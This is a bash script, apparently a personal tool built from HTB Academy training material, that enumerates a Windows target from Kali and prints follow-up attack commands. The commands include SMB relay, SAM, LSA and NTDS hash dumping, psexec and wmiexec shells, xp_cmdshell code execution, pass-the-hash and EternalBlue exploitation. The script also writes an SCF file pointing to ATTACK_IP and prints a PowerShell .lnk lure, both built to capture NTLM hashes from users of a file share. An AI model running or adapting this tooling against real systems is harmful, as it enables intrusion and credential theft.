#!/bin/bash
# ============================================================
# WWPE-LINUX - Remote Windows Enumeration from Kali/Linux
# Based on HTB Academy Windows Privilege Escalation Module
# Run from attack box against a Windows target
# Usage: ./wwpe_linux.sh
# ============================================================

# Colors
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

print_both() { echo -e "$1"; echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTPUT_FILE"; }
RED_FIND()    { print_both "${RED}${BOLD}[!!!] $1${NC}"; }
YELLOW_FIND() { print_both "${YELLOW}[??] $1${NC}"; }
GREEN_INFO()  { print_both "${GREEN}[+] $1${NC}"; }
NEXT_STEPS()  { print_both "${YELLOW}${BOLD}  [NEXT STEPS] $1${NC}"; }
SECTION()     {
    print_both ""
    print_both "${CYAN}${BOLD}========================================${NC}"
    print_both "${CYAN}${BOLD}  SECTION: $1${NC}"
    print_both "${CYAN}${BOLD}========================================${NC}"
}

# ============================================================
# BANNER AND INPUT
# ============================================================
echo -e "${CYAN}${BOLD}"
echo "  ____      ____  ____  _____   _     ___ _   _ _   ___  __"
echo " / ___\    /    \/    \/   __\ | |   |_ _| \ | | | | \ \/ /"
echo " | |  _ _ | |  || |  ||   __/  | |    | ||  \| | | | |\  / "
echo " | |_| | || |  || |  ||  |     | |___ | || |\  | |_| |/  \ "
echo "  \____/|_|\____/\____/\__|     |_____|___|_| \_|\___//_/\_\\"
echo "  Remote Windows Enumeration from Linux/Kali"
echo "  Based on HTB Academy Windows PrivEsc Module${NC}"
echo ""

read -p "[*] Target IP: " TARGET_IP
read -p "[*] Username (or press Enter for null session): " USERNAME
if [ ! -z "$USERNAME" ]; then
    read -s -p "[*] Password (or press Enter to skip): " PASSWORD
    echo ""
    read -p "[*] Domain (or press Enter for workgroup): " DOMAIN
fi

OUTPUT_FILE="wwpe_linux_${TARGET_IP}_$(date +%Y%m%d_%H%M%S).txt"
GREEN_INFO "Output saving to: $OUTPUT_FILE"
GREEN_INFO "Started: $(date)"
GREEN_INFO "Target: $TARGET_IP | User: ${USERNAME:-NULL SESSION}"

# Build credential strings for tools
if [ -z "$USERNAME" ]; then
    CME_CREDS="-u '' -p ''"
    SMB_CREDS="-U ''"
    RPCCLIENT_CREDS="-U '' -N"
    IMPACKET_CREDS="''@${TARGET_IP}"
else
    if [ ! -z "$DOMAIN" ]; then
        CME_CREDS="-u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN'"
        SMB_CREDS="-U '${DOMAIN}/${USERNAME}%${PASSWORD}'"
        RPCCLIENT_CREDS="-U '${DOMAIN}/${USERNAME}%${PASSWORD}'"
        IMPACKET_CREDS="${DOMAIN}/${USERNAME}:${PASSWORD}@${TARGET_IP}"
    else
        CME_CREDS="-u '$USERNAME' -p '$PASSWORD'"
        SMB_CREDS="-U '${USERNAME}%${PASSWORD}'"
        RPCCLIENT_CREDS="-U '${USERNAME}%${PASSWORD}'"
        IMPACKET_CREDS="${USERNAME}:${PASSWORD}@${TARGET_IP}"
    fi
fi

# ============================================================
SECTION "1 - PORT SCAN AND SERVICE DETECTION"
# ============================================================
GREEN_INFO "Running quick port scan on $TARGET_IP..."

# Check for common Windows ports
OPEN_PORTS=""
for port in 21 22 23 25 53 80 88 135 139 389 443 445 464 593 636 1433 3268 3269 3389 5985 5986 47001 49152; do
    result=$(timeout 2 bash -c "echo >/dev/tcp/$TARGET_IP/$port" 2>/dev/null && echo "open" || echo "closed")
    if [ "$result" = "open" ]; then
        OPEN_PORTS="$OPEN_PORTS $port"
        YELLOW_FIND "Port $port is OPEN"
        case $port in
            445)   GREEN_INFO "  SMB (445) open - primary attack surface" ;;
            3389)  GREEN_INFO "  RDP (3389) open - check for valid credentials" ;;
            5985)  GREEN_INFO "  WinRM HTTP (5985) open - check for valid credentials" ;;
            5986)  GREEN_INFO "  WinRM HTTPS (5986) open" ;;
            88)    GREEN_INFO "  Kerberos (88) open - likely Domain Controller" ;;
            389)   GREEN_INFO "  LDAP (389) open - likely Domain Controller" ;;
            1433)  YELLOW_FIND "MSSQL (1433) open - check for xp_cmdshell and SeImpersonatePrivilege" ;;
            135)   GREEN_INFO "  RPC (135) open" ;;
        esac
    fi
done

if echo "$OPEN_PORTS" | grep -q "88\|389\|3268"; then
    RED_FIND "Domain Controller indicators detected (ports 88/389/3268)"
    NEXT_STEPS "This appears to be a DC - high value target for credential dumping"
fi

# ============================================================
SECTION "2 - SMB ENUMERATION"
# ============================================================
GREEN_INFO "SMB enumeration on $TARGET_IP..."

# Check SMB signing
if command -v crackmapexec &>/dev/null; then
    GREEN_INFO "CrackMapExec SMB info:"
    cme_output=$(crackmapexec smb $TARGET_IP 2>/dev/null)
    print_both "$cme_output"

    if echo "$cme_output" | grep -q "signing:False"; then
        RED_FIND "SMB Signing is DISABLED - SMB relay attacks possible"
        NEXT_STEPS "Use Responder + ntlmrelayx.py for SMB relay attacks"
        NEXT_STEPS "responder -I tun0 -wrf"
        NEXT_STEPS "ntlmrelayx.py -tf targets.txt -smb2support"
    fi

    if echo "$cme_output" | grep -q "SMBv1:True"; then
        RED_FIND "SMBv1 is ENABLED - EternalBlue (MS17-010) may be applicable"
        NEXT_STEPS "Check with: crackmapexec smb $TARGET_IP -u '' -p '' -M ms17-010"
        NEXT_STEPS "Or: use auxiliary/scanner/smb/smb_ms17_010 in Metasploit"
    fi
else
    YELLOW_FIND "crackmapexec not found - install with: pip3 install crackmapexec"
fi

# Check null session
GREEN_INFO "Testing null session access:"
null_result=$(smbclient -L //$TARGET_IP -U '' -N 2>/dev/null)
if echo "$null_result" | grep -q "Sharename"; then
    RED_FIND "NULL SESSION ACCESS - anonymous SMB enumeration possible"
    print_both "$null_result"
    NEXT_STEPS "Enumerate shares: smbclient -L //$TARGET_IP -U '' -N"
    NEXT_STEPS "Connect to share: smbclient //$TARGET_IP/<share> -U '' -N"
else
    GREEN_INFO "Null session denied (expected)"
fi

# Enumerate shares with credentials if provided
if [ ! -z "$USERNAME" ]; then
    GREEN_INFO "Enumerating shares with credentials:"
    share_output=$(smbclient -L //$TARGET_IP $SMB_CREDS 2>/dev/null)
    print_both "$share_output"

    # Check for interesting shares
    for share in "ADMIN\$" "C\$" "SYSVOL" "NETLOGON" "IPC\$" "Users" "Backup" "IT" "Files" "Data" "Share"; do
        if echo "$share_output" | grep -iq "$share"; then
            YELLOW_FIND "Accessible share: $share"
            if echo "$share" | grep -qi "Backup\|IT\|Files\|Data\|Share"; then
                NEXT_STEPS "Browse share for credentials/sensitive files: smbclient //$TARGET_IP/$share $SMB_CREDS"
                NEXT_STEPS "Recursive download: smbclient //$TARGET_IP/$share $SMB_CREDS -c 'recurse; prompt; mget *'"
            fi
        fi
    done
fi

# ============================================================
SECTION "3 - MS17-010 (ETERNALBLUE) CHECK"
# ============================================================
GREEN_INFO "Checking for MS17-010 (EternalBlue)..."

if command -v crackmapexec &>/dev/null && [ ! -z "$USERNAME" ]; then
    eternal_result=$(crackmapexec smb $TARGET_IP $CME_CREDS -M ms17-010 2>/dev/null)
    print_both "$eternal_result"
    if echo "$eternal_result" | grep -qi "VULNERABLE\|MS17-010"; then
        RED_FIND "HOST MAY BE VULNERABLE TO MS17-010 (ETERNALBLUE)"
        NEXT_STEPS "Metasploit: use exploit/windows/smb/ms17_010_eternalblue"
        NEXT_STEPS "Set RHOSTS $TARGET_IP && set LHOST <tun0_IP> && run"
        NEXT_STEPS "For privesc (if already on box): forward port 445 and run exploit locally"
    fi
fi

# Manual SMB check
GREEN_INFO "Manual SMB version check:"
nmap_result=$(nmap -p445 --script smb-vuln-ms17-010 $TARGET_IP 2>/dev/null)
print_both "$nmap_result"
if echo "$nmap_result" | grep -qi "VULNERABLE\|State: VULNERABLE"; then
    RED_FIND "NMAP confirms MS17-010 vulnerability"
fi

# ============================================================
SECTION "4 - RPC ENUMERATION"
# ============================================================
GREEN_INFO "RPC enumeration via rpcclient..."

if command -v rpcclient &>/dev/null; then
    # Try enumdomusers
    GREEN_INFO "Domain users via rpcclient:"
    rpc_users=$(rpcclient -c "enumdomusers" $RPCCLIENT_CREDS $TARGET_IP 2>/dev/null)
    if echo "$rpc_users" | grep -q "user:"; then
        print_both "$rpc_users"
        YELLOW_FIND "Domain users enumerated via RPC"
        NEXT_STEPS "Enumerate user info: rpcclient -c 'queryuser <RID>' $TARGET_IP $RPCCLIENT_CREDS"
    else
        GREEN_INFO "RPC user enumeration denied"
    fi

    # Try enumdomgroups
    GREEN_INFO "Domain groups via rpcclient:"
    rpc_groups=$(rpcclient -c "enumdomgroups" $RPCCLIENT_CREDS $TARGET_IP 2>/dev/null)
    if echo "$rpc_groups" | grep -q "group:"; then
        print_both "$rpc_groups"
        # Check for high-value groups
        for grp in "Domain Admins" "Enterprise Admins" "Schema Admins" "DnsAdmins" "Server Operators" "Backup Operators"; do
            if echo "$rpc_groups" | grep -qi "$grp"; then
                YELLOW_FIND "High-value group found: $grp"
                NEXT_STEPS "Enumerate members: rpcclient -c 'querygroupmem <RID>' $TARGET_IP $RPCCLIENT_CREDS"
            fi
        done
    fi

    # Get domain info
    GREEN_INFO "Domain info:"
    rpc_domain=$(rpcclient -c "querydominfo" $RPCCLIENT_CREDS $TARGET_IP 2>/dev/null)
    print_both "$rpc_domain"

    # Check for password policy
    GREEN_INFO "Password policy:"
    rpc_policy=$(rpcclient -c "getdompwinfo" $RPCCLIENT_CREDS $TARGET_IP 2>/dev/null)
    print_both "$rpc_policy"
    if echo "$rpc_policy" | grep -q "min_password_length: 0\|min_password_length: [1-5]$"; then
        YELLOW_FIND "Weak password policy detected - minimum length is very short"
        NEXT_STEPS "Attempt password spraying with common passwords"
    fi
fi

# ============================================================
SECTION "5 - ENUM4LINUX-NG / ENUM4LINUX"
# ============================================================
GREEN_INFO "Running enum4linux-ng for comprehensive Windows enumeration..."

if command -v enum4linux-ng &>/dev/null; then
    if [ ! -z "$USERNAME" ]; then
        enum_output=$(timeout 60 enum4linux-ng -A -u "$USERNAME" -p "$PASSWORD" $TARGET_IP 2>/dev/null)
    else
        enum_output=$(timeout 60 enum4linux-ng -A $TARGET_IP 2>/dev/null)
    fi
    print_both "$enum_output"

    # Highlight key findings
    if echo "$enum_output" | grep -qi "password policy"; then
        YELLOW_FIND "Password policy information retrieved - check for spraying opportunities"
    fi
    if echo "$enum_output" | grep -qi "SID.*S-1-5-21"; then
        YELLOW_FIND "Domain SID retrieved - can enumerate users by RID cycling"
        NEXT_STEPS "RID cycle: for i in \$(seq 500 1100); do rpcclient -c \"queryuser \$i\" $TARGET_IP $RPCCLIENT_CREDS 2>/dev/null | grep 'User Name'; done"
    fi
elif command -v enum4linux &>/dev/null; then
    YELLOW_FIND "enum4linux-ng not found, using enum4linux:"
    if [ ! -z "$USERNAME" ]; then
        timeout 60 enum4linux -a -u "$USERNAME" -p "$PASSWORD" $TARGET_IP 2>/dev/null | tee -a "$OUTPUT_FILE"
    else
        timeout 60 enum4linux -a $TARGET_IP 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
else
    YELLOW_FIND "enum4linux and enum4linux-ng not found"
    NEXT_STEPS "Install: apt install enum4linux OR pip3 install enum4linux-ng"
fi

# ============================================================
SECTION "6 - WINRM CHECK"
# ============================================================
GREEN_INFO "Checking WinRM access..."

if command -v crackmapexec &>/dev/null && [ ! -z "$USERNAME" ]; then
    winrm_result=$(crackmapexec winrm $TARGET_IP $CME_CREDS 2>/dev/null)
    print_both "$winrm_result"

    if echo "$winrm_result" | grep -q "Pwn3d!"; then
        RED_FIND "WinRM ACCESS CONFIRMED as $USERNAME"
        NEXT_STEPS "Connect with evil-winrm: evil-winrm -i $TARGET_IP -u '$USERNAME' -p '$PASSWORD'"
        NEXT_STEPS "Or: evil-winrm -i $TARGET_IP -u '$USERNAME' -H '<NTLM_HASH>'"
    elif echo "$winrm_result" | grep -q "\+"; then
        YELLOW_FIND "WinRM authentication successful but not admin"
        NEXT_STEPS "evil-winrm -i $TARGET_IP -u '$USERNAME' -p '$PASSWORD'"
    fi
else
    # Manual check
    winrm_open=$(timeout 3 bash -c "echo >/dev/tcp/$TARGET_IP/5985" 2>/dev/null && echo "open" || echo "closed")
    if [ "$winrm_open" = "open" ]; then
        YELLOW_FIND "WinRM port 5985 is open"
        NEXT_STEPS "evil-winrm -i $TARGET_IP -u '<user>' -p '<pass>'"
    fi
fi

# ============================================================
SECTION "7 - CREDENTIAL VALIDATION AND SPRAY"
# ============================================================
if [ ! -z "$USERNAME" ] && command -v crackmapexec &>/dev/null; then
    GREEN_INFO "Validating credentials on SMB:"
    cme_auth=$(crackmapexec smb $TARGET_IP $CME_CREDS 2>/dev/null)
    print_both "$cme_auth"

    if echo "$cme_auth" | grep -q "Pwn3d!"; then
        RED_FIND "ADMIN ACCESS CONFIRMED via SMB as $USERNAME"
        NEXT_STEPS "Dump SAM: crackmapexec smb $TARGET_IP $CME_CREDS --sam"
        NEXT_STEPS "Dump LSA: crackmapexec smb $TARGET_IP $CME_CREDS --lsa"
        NEXT_STEPS "Run command: crackmapexec smb $TARGET_IP $CME_CREDS -x 'whoami'"
        NEXT_STEPS "Dump NTDS (if DC): crackmapexec smb $TARGET_IP $CME_CREDS --ntds"
        NEXT_STEPS "secretsdump.py $IMPACKET_CREDS"
    elif echo "$cme_auth" | grep -q "\[\+\]"; then
        YELLOW_FIND "Valid credentials but not admin"
        NEXT_STEPS "Try: psexec.py $IMPACKET_CREDS OR wmiexec.py $IMPACKET_CREDS"
    fi
fi

# ============================================================
SECTION "8 - IMPACKET REMOTE CHECKS"
# ============================================================
if [ ! -z "$USERNAME" ]; then
    GREEN_INFO "Checking available Impacket tools:"

    # Check for secretsdump
    if command -v secretsdump.py &>/dev/null || command -v impacket-secretsdump &>/dev/null; then
        GREEN_INFO "secretsdump available"
        NEXT_STEPS "Dump all hashes (if admin): secretsdump.py $IMPACKET_CREDS"
        NEXT_STEPS "DC domain dump: secretsdump.py $IMPACKET_CREDS -just-dc-ntlm"
    fi

    # Check for psexec
    if command -v psexec.py &>/dev/null || command -v impacket-psexec &>/dev/null; then
        GREEN_INFO "psexec.py available"
        NEXT_STEPS "Get SYSTEM shell: psexec.py $IMPACKET_CREDS"
    fi

    # Check for wmiexec
    if command -v wmiexec.py &>/dev/null || command -v impacket-wmiexec &>/dev/null; then
        GREEN_INFO "wmiexec.py available"
        NEXT_STEPS "Semi-interactive shell: wmiexec.py $IMPACKET_CREDS"
    fi

    # Check for smbexec
    if command -v smbexec.py &>/dev/null || command -v impacket-smbexec &>/dev/null; then
        GREEN_INFO "smbexec.py available"
        NEXT_STEPS "Stealthier shell: smbexec.py $IMPACKET_CREDS"
    fi

    # mssqlclient for MSSQL
    if echo "$OPEN_PORTS" | grep -q "1433"; then
        if command -v mssqlclient.py &>/dev/null || command -v impacket-mssqlclient &>/dev/null; then
            YELLOW_FIND "MSSQL port open + mssqlclient available"
            NEXT_STEPS "Connect: mssqlclient.py -windows-auth $IMPACKET_CREDS"
            NEXT_STEPS "Then enable xp_cmdshell for RCE: SQL> enable_xp_cmdshell"
            NEXT_STEPS "Then: SQL> xp_cmdshell whoami /priv (check for SeImpersonatePrivilege)"
        fi
    fi
fi

# ============================================================
SECTION "9 - NMAP VULNERABILITY SCRIPTS"
# ============================================================
GREEN_INFO "Running Nmap vulnerability scripts against Windows ports..."

if command -v nmap &>/dev/null; then
    GREEN_INFO "SMB vulnerability scan:"
    nmap_smb=$(nmap -p 445 --script smb-vuln-ms08-067,smb-vuln-ms17-010,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-security-mode $TARGET_IP 2>/dev/null)
    print_both "$nmap_smb"

    if echo "$nmap_smb" | grep -qi "VULNERABLE"; then
        RED_FIND "NMAP found SMB vulnerabilities - see above"
    fi

    if echo "$OPEN_PORTS" | grep -q "3389"; then
        GREEN_INFO "RDP vulnerability scan:"
        nmap_rdp=$(nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption $TARGET_IP 2>/dev/null)
        print_both "$nmap_rdp"
        if echo "$nmap_rdp" | grep -qi "VULNERABLE"; then
            RED_FIND "NMAP found RDP vulnerabilities - see above"
        fi
    fi
else
    YELLOW_FIND "nmap not found"
fi

# ============================================================
SECTION "10 - HASH CAPTURE SETUP REMINDERS"
# ============================================================
GREEN_INFO "Tools for capturing NTLMv2 hashes (for use with file share attacks):"

if command -v responder &>/dev/null; then
    GREEN_INFO "Responder is installed"
    NEXT_STEPS "Start Responder: sudo responder -wrf -v -I tun0"
    NEXT_STEPS "Then drop SCF file on share: [Shell]\nCommand=2\nIconFile=\\\\$(hostname -I | awk '{print $1}')\\share\\legit.ico\n[Taskbar]\nCommand=ToggleDesktop"
    NEXT_STEPS "SCF no longer works on Server 2019 - use malicious .lnk file instead"
    NEXT_STEPS "Crack captured hash: hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt"
else
    YELLOW_FIND "Responder not found - install with: apt install responder"
fi

# SCF file generator
cat > /tmp/at_shares.scf 2>/dev/null << EOF
[Shell]
Command=2
IconFile=\\\\ATTACK_IP\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop
EOF
if [ -f /tmp/at_shares.scf ]; then
    YELLOW_FIND "SCF template created at /tmp/at_shares.scf"
    NEXT_STEPS "Edit ATTACK_IP in /tmp/at_shares.scf then upload to file share"
    NEXT_STEPS "Name it @Inventory.scf or similar to appear at top of directory"
fi

# .lnk file reminder
NEXT_STEPS "Server 2019 .lnk hash capture (run on target):"
NEXT_STEPS "\$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut('C:\share\legit.lnk')"
NEXT_STEPS "\$lnk.TargetPath = '\\\\ATTACK_IP\\@pwn.png'; \$lnk.Save()"

# ============================================================
SECTION "11 - PASS-THE-HASH / PASS-THE-TICKET"
# ============================================================
GREEN_INFO "Pass-the-Hash / Pass-the-Ticket techniques:"
NEXT_STEPS "PtH with crackmapexec: crackmapexec smb $TARGET_IP -u '<user>' -H '<NT_HASH>'"
NEXT_STEPS "PtH with psexec: psexec.py '<domain>/<user>@$TARGET_IP' -hashes ':<NT_HASH>'"
NEXT_STEPS "PtH with evil-winrm: evil-winrm -i $TARGET_IP -u '<user>' -H '<NT_HASH>'"
NEXT_STEPS "PtH with wmiexec: wmiexec.py -hashes ':<NT_HASH>' '<domain>/<user>@$TARGET_IP'"
NEXT_STEPS "PtT: export KRB5CCNAME=ticket.ccache; psexec.py -k -no-pass '<domain>/<user>@<host>'"

# ============================================================
SECTION "12 - LEGACY OS CHECKS"
# ============================================================
GREEN_INFO "Legacy OS specific checks..."

if command -v crackmapexec &>/dev/null; then
    # Get OS info
    os_info=$(crackmapexec smb $TARGET_IP 2>/dev/null | grep -o "Windows.*)")
    print_both "OS Info: $os_info"

    if echo "$os_info" | grep -qi "Windows 7\|Server 2008\|Windows XP\|Server 2003"; then
        RED_FIND "LEGACY OS DETECTED: $os_info"
        RED_FIND "Multiple high-impact vulnerabilities likely available"
        NEXT_STEPS "Run Sherlock.ps1 on target: Import-Module Sherlock.ps1; Find-AllVulns"
        NEXT_STEPS "Or Windows-Exploit-Suggester: python2.7 windows-exploit-suggester.py --database <db.xls> --systeminfo sysinfo.txt"
        NEXT_STEPS "Key CVEs for Server 2008/Win7: MS10-092, MS16-032, MS15-051, MS17-010"
        NEXT_STEPS "Metasploit: smb_delivery module for initial access, then ms10_092_schelevator for privesc"
    fi
fi

# ============================================================
SECTION "FINAL SUMMARY"
# ============================================================
echo ""
echo -e "${RED}${BOLD}=== HIGH CONFIDENCE FINDINGS (RED) ===${NC}"
grep "\[!!!\]" "$OUTPUT_FILE" | while read line; do echo -e "${RED}$line${NC}"; done

echo ""
echo -e "${YELLOW}${BOLD}=== POSSIBLE FINDINGS (YELLOW) ===${NC}"
grep "\[??\]" "$OUTPUT_FILE" | while read line; do echo -e "${YELLOW}$line${NC}"; done

echo ""
GREEN_INFO "Scan complete: $(date)"
GREEN_INFO "Full output saved to: $OUTPUT_FILE"
echo ""
echo -e "${CYAN}${BOLD}GREP TIPS:${NC}"
echo -e "${CYAN}  grep '\[!!!\]' $OUTPUT_FILE     # High confidence findings${NC}"
echo -e "${CYAN}  grep '\[??\]' $OUTPUT_FILE      # Possible findings${NC}"
echo -e "${CYAN}  grep 'NEXT STEPS' $OUTPUT_FILE  # All next step reminders${NC}"
echo -e "${CYAN}  grep 'SECTION:' $OUTPUT_FILE    # Jump to sections${NC}"
